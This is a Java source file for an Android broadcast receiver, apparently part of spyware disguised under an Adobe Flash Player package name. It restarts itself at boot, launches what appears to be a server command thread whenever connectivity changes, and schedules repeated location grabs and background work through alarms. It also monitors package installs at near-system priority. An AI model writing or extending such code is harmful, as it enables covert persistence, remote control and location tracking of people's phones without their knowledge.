package com.adobe.flashplayer.core;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.Log;

import com.adobe.flashplayer.MainEntry;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.data.PhoneLocationWrapper;
import com.adobe.flashplayer.network.Network;

/*
不能静态注册的广播:
	　　android.intent.action.SCREEN_ON
	　　android.intent.action.SCREEN_OFF
	　　android.intent.action.BATTERY_CHANGED
	　　android.intent.action.CONFIGURATION_CHANGED
	　　android.intent.action.TIME_TICK
*/

public class Broadcast extends BroadcastReceiver {

    private final String TAG 			= "[ljg]Broadcast ";

    public static int batteryPercent 	= 0;
    public static Broadcast gBroadcastReceiver = null;

    @Override
    public void onReceive(Context context, Intent intent) {

        String action = intent.getAction();
        try{
            if (Intent.ACTION_SCREEN_ON.equals(action) ) {
                Log.e(TAG,"ACTION_SCREEN_ON");
            }
            else if (Intent.ACTION_SCREEN_OFF.equals(action) ) {
                Log.e(TAG,"ACTION_SCREEN_OFF");
            }
            else if (action.equals(Intent.ACTION_BATTERY_CHANGED)){
                int current = intent.getExtras().getInt("level");
                int total = intent.getExtras().getInt("scale");
                batteryPercent = current * 100 / total;
                Log.e(TAG,"phone current power:%"+batteryPercent);
            }
            else if(action.equals("android.intent.action.BOOT_COMPLETED")){

                CoreHelper.launchForegroundService(context);

                Log.e(TAG,"BOOT_COMPLETED");
                MyLog.writeLogFile("receive BOOT_COMPLETED\r\n");
            }
            else if (action.equals("android.net.conn.CONNECTIVITY_CHANGE")) {
                Log.e(TAG,"android.net.conn.CONNECTIVITY_CHANGE");

                Network.launchServerCmdThread(context);
            }
            else if (action.equals(Intent.ACTION_USER_PRESENT)) {
                Log.d(TAG,"android.intent.action.USER_PRESENT");
            }
            else if (action.equals("android.intent.action.ACTION_SHUTDOWN")) {
                Log.e(TAG,"shutdown system");
               MyLog.writeLogFile("shutdown system\r\n");
            }
            else if (Intent.ACTION_PACKAGE_ADDED.equals(action)) {
                String packageName = intent.getData().getSchemeSpecificPart();
                if (packageName.equals(context.getPackageName())) {

                }
                Log.e(TAG,"ACTION_PACKAGE_ADDED:" + packageName);
            }
            else if (Intent.ACTION_PACKAGE_REMOVED.equals(action)) {
                String packageName = intent.getData().getSchemeSpecificPart();
                Log.e(TAG,"ACTION_PACKAGE_REMOVED:" + packageName);
                if (packageName.equals(context.getPackageName())) {

                }
            }
            else if (Intent.ACTION_PACKAGE_REPLACED.equals(action)) {
                String packageName = intent.getData().getSchemeSpecificPart();
                Log.e(TAG,"ACTION_PACKAGE_REPLACED:" + packageName);
                if (packageName.equals(context.getPackageName())) {

                }
            }
            else if (action.equals(Public.PHONEWORK_ALARM_ACTION)){

                CoreHelper.launchWorkThread(context);

                CoreHelper.scheduleWorkAlarm(context);
            }
            else if (action.equals(Public.PHONELOCATION_ALARM_ACTION)){

                PhoneLocationWrapper.getLastLocation(context);

                CoreHelper.scheduleLocationAlarm(context);
            }
            else{
                Log.e(TAG,"action:" + action);
                return;
            }
        }
        catch (Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile(TAG+"BroadcastReceiver exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
            return ;
        }
    }


    public static void unregBroardcast(Context context){
        if (gBroadcastReceiver != null) {
            context.unregisterReceiver(gBroadcastReceiver);
        }
    }


    public static void registryBroadcast(Context context){
        if (gBroadcastReceiver == null) {
            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_SCREEN_ON);
            filter.addAction(Intent.ACTION_SCREEN_OFF);
            filter.addAction(Intent.ACTION_BATTERY_CHANGED);
            filter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
            filter.addAction("android.net.wifi.WIFI_STATE_CHANGED");
            filter.addAction("android.net.wifi.STATE_CHANGE");
            filter.addAction(Intent.ACTION_USER_PRESENT);
            filter.addAction(Intent.ACTION_TIME_TICK);
            filter.addAction(Intent.ACTION_SHUTDOWN);

            filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
            filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
            filter.addAction(Intent.ACTION_PACKAGE_ADDED);

            filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY - 1);
            filter.addDataScheme("package");
            gBroadcastReceiver = new Broadcast();
            context.registerReceiver(gBroadcastReceiver, filter);
        }
    }


}


